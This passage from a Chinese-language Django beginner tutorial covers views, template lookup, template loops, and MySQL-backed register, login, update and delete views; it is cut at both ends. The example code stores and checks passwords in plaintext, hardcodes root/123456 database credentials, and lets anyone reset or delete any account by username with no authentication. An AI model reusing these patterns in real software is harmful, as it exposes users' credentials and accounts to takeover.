用户请求相关的所有内容</p><p>在<code>request</code>中获取用户提交的数据等信息</p></li><li><p>视图函数主要是实现业务逻辑操作</p></li><li><p>返回业务逻辑结果，常见的返回有三种</p><p><code>return HttpResponse(&quot;登陆页面&quot;)</code> 返回的是一个文本，文本内容是传入的内容</p><p><code>return  render(request,&quot;login.html&quot;)</code> 返回一个<code>html</code>的网页</p><p><code>return redirect(&quot;https://www.baidu.com&quot;)</code> 重定向到另一个网页</p></li></ul><p>有一个问题，那么上述<code>login.html</code>放在哪呢？在<code>django_test</code>目录下面有一个<code>settings.py</code>文件<br><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408151046207.png" alt="image-20240815104607037"></p><p>默认会从<code>DIRS</code>目录里面寻找</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="string">&quot;DIRS&quot;</span>: [os.path.join(BASE_DIR, <span class="string">&quot;templates&quot;</span>)]</span><br></pre></td></tr></table></figure><p>之后在根目录(manage.py同级目录)创建一个<code>templates</code>文件夹，在里面编写<code>login.html</code>如下</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">        登录界面</span><br><span class="line">    <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后编写视图函数<code>web/views.py</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render, HttpResponse, redirect</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create your views here.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="comment"># return HttpResponse(&quot;登录页面&quot;)</span></span><br><span class="line">    <span class="comment"># return redirect(&quot;https://www.baidu.com&quot;)</span></span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&quot;login.html&quot;</span>)</span><br></pre></td></tr></table></figure><p>访问l<code>ocalhost:8000/login</code>就可以看到一个登录页面了。</p><p>还有一个寻找方案为在<code>settings.py</code>目录下，在<code>INSTALLED_APPS</code>项下面添加一项<code>”web“</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">INSTALLED_APPS = [</span><br><span class="line">    <span class="string">&quot;django.contrib.admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;django.contrib.auth&quot;</span>,</span><br><span class="line">    <span class="string">&quot;django.contrib.contenttypes&quot;</span>,</span><br><span class="line">    <span class="string">&quot;django.contrib.sessions&quot;</span>,</span><br><span class="line">    <span class="string">&quot;django.contrib.messages&quot;</span>,</span><br><span class="line">    <span class="string">&quot;django.contrib.staticfiles&quot;</span>,</span><br><span class="line">    <span class="string">&quot;web&quot;</span>,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>之后在web目录下面，新建一个templates文件夹，编写<code>login1.html</code></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">        登录界面111</span><br><span class="line">    <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>访问发现显示<strong>登录界面111</strong>，说明配置成功。但是如果两个地方同时出现了<code>login.html</code> 呢，下面来测试一下，将<code>login1.html</code>重命名为<code>login.html</code>，发现页面显示为<strong>登录页面</strong></p><p><strong>结论：</strong>同时存在<code>templates</code>文件夹的时候，会优先在项目于根目录的<code>templates</code>寻找文件，其次在<code>app</code>文件夹下的<code>templates</code>目录寻找。因此，可以在网站根目录下的<code>templates</code>文件夹下面放公共的网页，在<code>app</code>文件夹下的<code>templates</code>文件夹放这个<code>app</code>所需要实现的网页。p><h2 id="初识模板"><a href="#初识模板" class="headerlink" title="初识模板"></a>初识模板</h2><p>考虑如下一种情况，现在有一个公司的员工表，我希望在网页里面动态的显示出来，编写如下<code>user.html</code>文件</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>User<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">        1、张三</span><br><span class="line">        2、李四</span><br><span class="line">        3、王五</span><br><span class="line">    <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样的网站肯定是静态的，如果员工表的内容改变，则必须一个一个修改。要想实现自动读取一个列表里面的名字并显示出来，就要采用模板里面的语法了。重新编写<code>user.html</code>如下</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>User<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">        &#123;%for user in users%&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">            &#123;&#123;user&#125;&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        &#123;%endfor%&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>编写<code>views.py</code>定义<code>user</code>函数如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">user</span>(<span class="params">request</span>):</span><br><span class="line">    users = [<span class="string">&quot;张三&quot;</span>, <span class="string">&quot;李四&quot;</span>, <span class="string">&quot;王五&quot;</span>]</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&quot;user.html&quot;</span>, &#123;<span class="string">&quot;users&quot;</span>: users&#125;)</span><br></pre></td></tr></table></figure><p>在模板里面通过<code>&#123;%for%&#125;`以及`&#123;%endfor%&#125;</code>实现了for循环，如果要显示函数里面定义的变量则需要用<code>&#123;&#123;变量&#125;&#125;</code>，在函数的返回值里面就要用一个字典的形式来返回该变量。最后结果如图</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408151417046.png" alt="image-20240815141741971"></p><p>如果想在模板里面只读取一个列表元素，与python索引不同的地方在于模板的索引是用<code>.</code>来进行索引，例如<code>&#123;&#123;users.0&#125;&#125;</code></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>User<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">        &#123;%for user in users%&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">            &#123;&#123;user&#125;&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        &#123;%endfor%&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><br><span class="line">        &#123;&#123;users.0&#125;&#125;</span><br><span class="line">        &#123;&#123;users.1&#125;&#125;</span><br><span class="line">        &#123;&#123;users.2&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408151423140.png" alt="image-20240815142351089"></p><p>如果定义的是一个字典呢，方法也差不多，<code>user.html</code>如下</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>User<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">        &#123;%for user in users%&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">            &#123;&#123;user&#125;&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        &#123;%endfor%&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><br><span class="line">        &#123;&#123;users.0&#125;&#125;</span><br><span class="line">        &#123;&#123;users.1&#125;&#125;</span><br><span class="line">        &#123;&#123;users.2&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        &#123;&#123;info&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        &#123;&#123;info.name&#125;&#125;</span><br><span class="line">        &#123;&#123;info.age&#125;&#125;</span><br><span class="line">        &#123;&#123;info.sex&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span></span><br><span class="line">            keys:</span><br><span class="line">        <span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        &#123;%for key in info.keys%&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">            &#123;&#123;key&#125;&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        &#123;%endfor%&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span></span><br><span class="line">            values:</span><br><span class="line">        <span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        &#123;%for value in info.values%&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">            &#123;&#123;value&#125;&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        &#123;%endfor%&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span></span><br><span class="line">            items:</span><br><span class="line">        <span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        &#123;% for key, value in info.items%&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">            &#123;&#123;key&#125;&#125;:&#123;&#123;value&#125;&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        &#123;%endfor%&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>编写<code>views.py</code>如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">user</span>(<span class="params">request</span>):</span><br><span class="line">    users = [<span class="string">&quot;张三&quot;</span>, <span class="string">&quot;李四&quot;</span>, <span class="string">&quot;王五&quot;</span>]</span><br><span class="line">    info=&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">18</span>,<span class="string">&quot;sex&quot;</span>:<span class="string">&quot;男&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&quot;user.html&quot;</span>, &#123;<span class="string">&quot;users&quot;</span>: users,<span class="string">&quot;info&quot;</span>: info&#125;)</span><br></pre></td></tr></table></figure><p>结果如图：</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408151439540.png" alt="image-20240815143903444"></p><h2 id="操作数据库"><a href="#操作数据库" class="headerlink" title="操作数据库"></a>操作数据库</h2><h3 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h3><p>首先需要连接数据库，在<code>setting.py</code>中(以MySQL为例)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">DATABASES = &#123;</span><br><span class="line">    <span class="string">&#x27;default&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;ENGINE&#x27;</span>: <span class="string">&#x27;django.db.backends.mysql&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;NAME&#x27;</span>: <span class="string">&#x27;django&#x27;</span>, <span class="comment">#数据库的名字</span></span><br><span class="line">        <span class="string">&#x27;USER&#x27;</span>: <span class="string">&#x27;root&#x27;</span>, <span class="comment">#数据库账号</span></span><br><span class="line">        <span class="string">&#x27;PASSWORD&#x27;</span>: <span class="string">&#x27;123456&#x27;</span>, <span class="comment">#数据库密码</span></span><br><span class="line">        <span class="string">&#x27;HOST&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="comment">#数据库ip</span></span><br><span class="line">        <span class="string">&#x27;PORT&#x27;</span>: <span class="string">&#x27;3306&#x27;</span>, <span class="comment">#数据库端口</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="定义数据表"><a href="#定义数据表" class="headerlink" title="定义数据表"></a>定义数据表</h3><p>定义数据库的实现主要在<code>model.py</code>页面</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserInfo</span>(models.Model):</span><br><span class="line">    <span class="comment">#用户名是唯一的</span></span><br><span class="line">    username = models.CharField(max_length=<span class="number">32</span>, unique=<span class="literal">True</span>)</span><br><span class="line">    password = models.CharField(max_length=<span class="number">64</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上述定义了一个<code>UserInfo</code>类的表，有两列分别为：</p><ul><li>username：CharField=varchar</li><li>password：CharField=varchar</li></ul><h3 id="创建数据表"><a href="#创建数据表" class="headerlink" title="创建数据表"></a>创建数据表</h3><p>但此时只是定义了一个类，并没有对数据库进行迁移，运行</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python manage.py makemigrations</span><br><span class="line"></span><br><span class="line">python manage.py migrate</span><br></pre></td></tr></table></figure><p>两条命令都需要执行，且顺序不能调换</p><p>此时会在定义的app目录下生成一个<code>migrations</code>文件夹</p><h3 id="添加数据项"><a href="#添加数据项" class="headerlink" title="添加数据项"></a>添加数据项</h3><p>在<code>views.py</code>文件中</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.POST.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.POST.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> UserInfo.objects.<span class="built_in">filter</span>(username=username).first():</span><br><span class="line">            <span class="keyword">return</span> render(request, <span class="string">&#x27;register.html&#x27;</span>, &#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;用户名已存在&#x27;</span>&#125;)</span><br><span class="line">        UserInfo.objects.create(username=username, password=password)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span>  render(request, <span class="string">&#x27;register.html&#x27;</span>, &#123;<span class="string">&#x27;success&#x27;</span>: <span class="string">&#x27;注册成功&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure><p>上述定义了注册用户的逻辑，编写<code>register.html</code>如下</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Register<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Register<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/register/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> &gt;</span></span><br><span class="line">            &#123;% csrf_token %&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">                    Username:</span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">                    Password:</span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Register&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                &#123;&#123;error&#125;&#125;</span><br><span class="line">                &#123;&#123;success&#125;&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>同时在<code>urls.py</code>中定义路由</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">path(<span class="string">&quot;register/&quot;</span>,register,name=<span class="string">&quot;register&quot;</span>),</span><br></pre></td></tr></table></figure><p>这样就可以完成一个简单的注册逻辑</p><h3 id="查找数据项"><a href="#查找数据项" class="headerlink" title="查找数据项"></a>查找数据项</h3><p>在<code>views.py</code>文件中</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.POST.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.POST.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        user = UserInfo.objects.<span class="built_in">filter</span>(username=username, password=password).first()</span><br><span class="line">        <span class="keyword">if</span> user:</span><br><span class="line">            <span class="keyword">return</span> render(request, <span class="string">&#x27;login.html&#x27;</span>, &#123;<span class="string">&#x27;success&#x27;</span>: <span class="string">&#x27;登录成功&#x27;</span>&#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render(request, <span class="string">&#x27;login.html&#x27;</span>, &#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;用户名或密码错误&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure><p>上述定义了登录的逻辑</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">user = UserInfo.objects.<span class="built_in">filter</span>(username=username, password=password).first()</span><br></pre></td></tr></table></figure><p><code>filter</code>意为<strong>过滤</strong>，所以该语句从<code>UserInfo</code>表里面查找是否有该用户名和密码，有多个则返回第一个。若<code>username</code>是<code>unique</code>则可以不用<code>first</code>方法。</p><p>编写<code>login.html</code>如下</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Register<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/login/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> &gt;</span></span><br><span class="line">            &#123;% csrf_token %&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">                    Username:</span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">                    Password:</span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Register&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                &#123;&#123;error&#125;&#125;</span><br><span class="line">                &#123;&#123;success&#125;&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>同时在<code>urls.py</code>中定义路由</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">path(<span class="string">&quot;login/&quot;</span>,login,name=<span class="string">&quot;login&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="更新数据项"><a href="#更新数据项" class="headerlink" title="更新数据项"></a>更新数据项</h3><p>在<code>view.py</code>文件中</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_user</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.POST.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        new_password = request.POST.get(<span class="string">&#x27;new_password&#x27;</span>)</span><br><span class="line">        user = UserInfo.objects.<span class="built_in">filter</span>(username=username).first()</span><br><span class="line">        <span class="keyword">if</span> user:</span><br><span class="line">            user.password = new_password</span><br><span class="line">            user.save()</span><br><span class="line">            <span class="keyword">return</span> render(request, <span class="string">&#x27;update_user.html&#x27;</span>, &#123;<span class="string">&#x27;success&#x27;</span>: <span class="string">&#x27;用户信息更新成功&#x27;</span>&#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render(request, <span class="string">&#x27;update_user.html&#x27;</span>, &#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;用户不存在&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&#x27;update_user.html&#x27;</span>)</span><br></pre></td></tr></table></figure><p>直接获取新的密码，用<code>save</code>方法即可保存</p><h3 id="删除数据项"><a href="#删除数据项" class="headerlink" title="删除数据项"></a>删除数据项</h3><p>在<code>view.py</code>文件中</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_user</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.POST.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        user = UserInfo.objects.<span class="built_in">filter</span>(username=username).first()</span><br><span class="line">        <span class="keyword">if</span> user:</span><br><span class="line">            user.delete()</span><br><span class="line">            <span class="keyword">return</span> render(request, <span 